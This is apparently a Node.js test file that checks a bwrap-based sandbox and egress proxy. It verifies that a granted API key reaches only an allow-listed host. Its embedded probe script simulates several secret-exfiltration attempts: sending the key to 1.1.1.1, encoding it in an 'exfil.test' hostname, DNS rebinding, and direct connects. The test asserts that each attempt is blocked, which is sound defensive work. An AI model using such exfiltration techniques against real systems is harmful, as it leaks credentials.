/**
 * Egress, walked on Linux: a real node process under bwrap --unshare-net,
 * holding a granted key, against two listeners in the supervising network
 * namespace. Inside, the run has only its own loopback; the loopback bridge
 * puts the proxy's Unix socket (and a loopback provider's relay) on two
 * fixed inner ports, and nothing else crosses.
 *
 * Skipped off Linux and where bwrap cannot start a namespace. With
 * SEATS_REQUIRE_BWRAP=1 (CI) a missing bwrap fails the file instead.
 * The one non-local connect (1.1.1.1:443) runs only after the argv is shown
 * to unshare the network; in an empty namespace it fails at connect() with
 * no route, before any packet is built.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { createServer } from 'node:net';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { networkInterfaces, tmpdir } from 'node:os';
import { join } from 'node:path';
import { prepareRunEnv } from '../src/valet/env.js';
import { sandboxRunArgv, startRunEgress } from '../src/valet/sandbox.js';
import { detectBwrap } from '../src/sandbox/bwrap.js';
import { startFakeProvider } from '../test-support/fake-provider.js';

const KEY = 'sk-granted-egress-0123456789abcdef';
const found = process.platform === 'linux' ? detectBwrap() : { available: false, error: 'not Linux' };
const required = process.env.SEATS_REQUIRE_BWRAP === '1';
if (required) assert.ok(found.available, `SEATS_REQUIRE_BWRAP=1 but bwrap cannot run: ${found.error}`);
const linuxTest = found.available ? test : test.skip;

/** A listener on every address of this namespace; counts what reaches it. */
const listener = async () => {
  const state = { connections: 0, bytes: Buffer.alloc(0) };
  const server = createServer((socket) => {
    state.connections += 1;
    socket.on('error', () => {});
    socket.on('data', (chunk) => {
      state.bytes = Buffer.concat([state.bytes, chunk]);
      socket.end('HTTP/1.1 200 OK\r\nContent-Length: 4\r\nConnection: close\r\n\r\npong');
    });
  });
  await new Promise((done) => server.listen(0, '0.0.0.0', done));
  state.port = server.address().port;
  state.close = () => new Promise((done) => { server.closeAllConnections?.(); server.close(() => done()); });
  return state;
};

const run = (argv, { env, cwd }) => new Promise((done) => {
  const child = spawn(argv[0], argv.slice(1), { env, cwd, stdio: ['ignore', 'pipe', 'pipe'] });
  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (chunk) => { stdout += chunk; });
  child.stderr.on('data', (chunk) => { stderr += chunk; });
  const timer = setTimeout(() => child.kill('SIGKILL'), 30_000);
  child.on('close', (code) => { clearTimeout(timer); done({ code, stdout, stderr }); });
});

/** This namespace's first non-loopback IPv4 address, if it has one. */
const outerAddress = () => Object.values(networkInterfaces()).flat()
  .find((entry) => entry && entry.family === 'IPv4' && !entry.internal)?.address || null;

/** The first nameserver the run would be told to use. */
const nameserver = () => {
  try {
    return /^nameserver\s+(\S+)/m.exec(readFileSync('/etc/resolv.conf', 'utf8'))?.[1] || null;
  } catch { return null; }
};

// Reports codes and statuses only.
const PROBE = String.raw`
const net = require('net'); const dns = require('dns'); const dgram = require('dgram');
const [mode, A, C, providerURL, outer, ns] = process.argv.slice(1);
const key = process.env.OPENAI_API_KEY;
const once = (fn) => { let done = false; return (v) => { if (!done) { done = true; fn(v); } }; };
const viaProxy = (target, payload) => new Promise((resolve) => {
  const done = once(resolve);
  const proxy = new URL(process.env.HTTPS_PROXY);
  const s = net.connect({ host: proxy.hostname, port: Number(proxy.port) });
  let raw = ''; let open = false;
  s.on('error', (e) => done({ error: e.code }));
  s.on('connect', () => s.write('CONNECT ' + target + ' HTTP/1.1\r\nHost: ' + target + '\r\n\r\n'));
  s.on('data', (d) => {
    raw += d;
    if (!open && raw.includes('\r\n\r\n')) {
      const status = Number(raw.split(' ')[1]);
      if (status !== 200) { s.destroy(); done({ status }); return; }
      open = true; raw = ''; s.write(payload);
    }
  });
  s.on('close', () => done({ status: open ? 200 : 0, reply: raw.split('\r\n\r\n')[1] }));
  setTimeout(() => { s.destroy(); done({ timeout: true }); }, 5000);
});
const direct = (host, port, payload) => new Promise((resolve) => {
  const done = once(resolve);
  const started = Date.now();
  const s = net.connect({ host, port });
  s.on('connect', () => { if (payload) s.write(payload); s.end(); done({ result: 'OK' }); });
  s.on('error', (e) => done({ result: e.code, ms: Date.now() - started }));
  setTimeout(() => { s.destroy(); done({ result: 'TIMEOUT' }); }, 5000);
});
const udp = (host, port) => new Promise((resolve) => {
  const done = once(resolve);
  const s = dgram.createSocket(host.includes(':') ? 'udp6' : 'udp4');
  s.on('error', (e) => { s.close(); done(e.code); });
  s.send(Buffer.from('probe'), Number(port), host, (e) => { s.close(); done(e ? e.code : 'SENT'); });
});
const lookup = (name) => new Promise((resolve) => dns.lookup(name, (e, a) => resolve(e ? e.code : a)));
const fetched = (url) => fetch(url).then((r) => r.text().then((t) => ({ status: r.status, body: t })), (e) => ({ error: e.cause?.code || e.name }));
(async () => {
  let out;
  if (mode === 'control') out = { directCanary: await direct(outer || '127.0.0.1', Number(C)) };
  if (mode === 'outside') out = { directOutside: await direct('1.1.1.1', 443, 'KEY ' + key), udpOutside: await udp('1.1.1.1', 53) };
  if (mode === 'confined') out = {
    holdsKey: key && key.length > 0,
    allowed: await viaProxy('allowed.localhost:' + A, 'KEY ' + key + '\r\n'),
    fetchAllowed: await fetched('http://allowed.localhost:' + A + '/through-node-fetch'),
    canary: await viaProxy('canary.localhost:' + C, 'KEY ' + key + '\r\n'),
    rebind: await viaProxy('a.wild.localhost:' + C, 'KEY ' + key),
    ipLiteral: await viaProxy('127.0.0.1:' + C, 'KEY ' + key),
    keyAsHost: await viaProxy(key + '.exfil.test:443', 'x'),
    directCanaryLoopback: await direct('127.0.0.1', Number(C), 'KEY ' + key),
    directCanaryOuter: outer ? await direct(outer, Number(C), 'KEY ' + key) : { result: 'NO_OUTER_ADDRESS' },
    directAllowedOuter: outer ? await direct(outer, Number(A), 'KEY ' + key) : { result: 'NO_OUTER_ADDRESS' },
    lookup: await lookup('canary.test'),
    udpNameserver: ns ? await udp(ns, 53) : 'NO_NAMESERVER',
    interfaces: Object.keys(require('os').networkInterfaces()),
    provider: await fetched(providerURL + '/models'),
  };
  process.stdout.write(JSON.stringify(out));
})();`;

const withEgress = async (fn) => {
  const root = mkdtempSync(join(tmpdir(), 'seats-egress-bwrap-'));
  const allowed = await listener();
  const canary = await listener();
  const provider = await startFakeProvider();
  const events = [];
  const trace = { emit: (type, data) => events.push({ type, data }) };
  const runEnv = await prepareRunEnv({
    grant: {
      credentials: [{ name: 'OPENAI_API_KEY', from: 'env' }],
      network: { allow: [`allowed.localhost:${allowed.port}`, `*.wild.localhost:${canary.port}`] },
    },
    baseEnv: { PATH: process.env.PATH, HOME: process.env.HOME, OPENAI_API_KEY: KEY },
    root,
  });
  const egress = await startRunEgress({ run: runEnv, provider: { baseURL: provider.baseURL }, trace });
  try {
    return await fn({ runEnv, egress, allowed, canary, provider, events, trace });
  } finally {
    await egress.close();
    await provider.close?.();
    await allowed.close();
    await canary.close();
    await runEnv.cleanup();
    rmSync(root, { recursive: true, force: true });
  }
};

const compose = (mode, { runEnv, egress, allowed, canary, provider, trace }) => {
  const composed = sandboxRunArgv({
    argv: [process.execPath, '-e', PROBE, mode, String(allowed.port), String(canary.port), provider.baseURL, outerAddress() || '', nameserver() || ''],
    run: runEnv,
    egress,
    trace,
    require: true,
  });
  assert.equal(composed.sandbox, 'bwrap');
  return composed;
};
const runComposed = (composed, { runEnv }) => run(composed.argv, { env: composed.env, cwd: runEnv.home });
const NO_ROUTE = new Set(['ENETUNREACH', 'EHOSTUNREACH', 'EPERM', 'EACCES']);

linuxTest('a confined run reaches the allowed host through the proxy, and nothing else at all', () => withEgress(async (ctx) => {
  const { allowed, canary, provider, events } = ctx;
  // Positive control, unsandboxed: the canary is reachable from this
  // namespace at its outer address, so a refusal below is the namespace.
  const control = await run([process.execPath, '-e', PROBE, 'control', String(allowed.port), String(canary.port), provider.baseURL, outerAddress() || ''], { env: { PATH: process.env.PATH } });
  assert.equal(control.code, 0, control.stderr);
  assert.deepEqual(JSON.parse(control.stdout), { directCanary: { result: 'OK' } });
  assert.equal(canary.connections, 1, 'the control connected');
  canary.connections = 0;
  canary.bytes = Buffer.alloc(0);

  const composed = compose('confined', ctx);
  const done = await runComposed(composed, ctx);
  assert.equal(done.code, 0, done.stderr);
  const seen = JSON.parse(done.stdout);
  if (process.env.SEATS_PRINT_WALK) console.error(`WALK ${done.stdout}`);
  assert.equal(seen.holdsKey, true);
  assert.deepEqual(seen.interfaces, ['lo'], 'the namespace has only its own loopback');

  assert.deepEqual(seen.allowed, { status: 200, reply: 'pong' });
  assert.ok(allowed.bytes.toString().includes(`KEY ${KEY}`), 'the key reached the host the grant names');

  assert.deepEqual(seen.canary, { status: 403 });
  assert.deepEqual(seen.rebind, { status: 403 });
  assert.deepEqual(seen.ipLiteral, { status: 403 });
  assert.deepEqual(seen.keyAsHost, { status: 403 });

  // Around the proxy: the run's own loopback has nothing on the canary's
  // port, and the namespace has no route to this one's addresses.
  assert.equal(seen.directCanaryLoopback.result, 'ECONNREFUSED');
  if (seen.directCanaryOuter.result !== 'NO_OUTER_ADDRESS') {
    assert.ok(NO_ROUTE.has(seen.directCanaryOuter.result), seen.directCanaryOuter.result);
    assert.ok(NO_ROUTE.has(seen.directAllowedOuter.result), seen.directAllowedOuter.result);
  }

  assert.notEqual(seen.lookup, '127.0.0.1');
  assert.match(seen.lookup, /^E[A-Z_]+$/, 'a name outside localhost does not resolve inside');
  if (seen.udpNameserver !== 'NO_NAMESERVER' && !/^127\./.test(nameserver())) {
    assert.ok(NO_ROUTE.has(seen.udpNameserver), `udp to the nameserver: ${seen.udpNameserver}`);
  }

  // A loopback provider rides the bridge's second slot, outside the proxy.
  assert.equal(composed.env.NO_PROXY, '127.0.0.1');
  assert.equal(seen.provider.status, 200);
  assert.match(seen.provider.body, /fake-model/);

  assert.equal(canary.connections, 0, 'the canary saw no connection from the sandbox');
  assert.equal(canary.bytes.length, 0, 'and not one byte');

  const denied = events.filter((e) => e.type === 'egress.denied').map((e) => e.data);
  assert.deepEqual(denied, [
    { host: 'canary.localhost', port: canary.port, reason: 'not_allowed' },
    { host: 'a.wild.localhost', port: canary.port, reason: 'private_address' },
    { host: '127.0.0.1', port: canary.port, reason: 'ip_literal' },
    { host: '[redacted]', port: 443, reason: 'not_allowed' },
  ]);
  assert.ok(!JSON.stringify(events).includes(KEY), 'no secret value in the trace');
}));

linuxTest('a direct connect to a non-local address has no route out of the namespace', () => withEgress(async (ctx) => {
  const composed = compose('outside', ctx);
  // The guard: the outside case runs only under an argv that unshares the network.
  assert.equal(composed.argv[0], found.path || 'bwrap');
  assert.ok(composed.argv.includes('--unshare-net') && !composed.argv.includes('--share-net'));
  const done = await runComposed(composed, ctx);
  assert.equal(done.code, 0, done.stderr);
  const { directOutside, udpOutside } = JSON.parse(done.stdout);
  if (process.env.SEATS_PRINT_WALK) console.error(`OUTSIDE ${done.stdout}`);
  assert.ok(NO_ROUTE.has(directOutside.result), directOutside.result);
  assert.ok(directOutside.ms < 1000, 'refused at connect(), not after a network timeout');
  assert.ok(NO_ROUTE.has(udpOutside), `udp: ${udpOutside}`);
}));
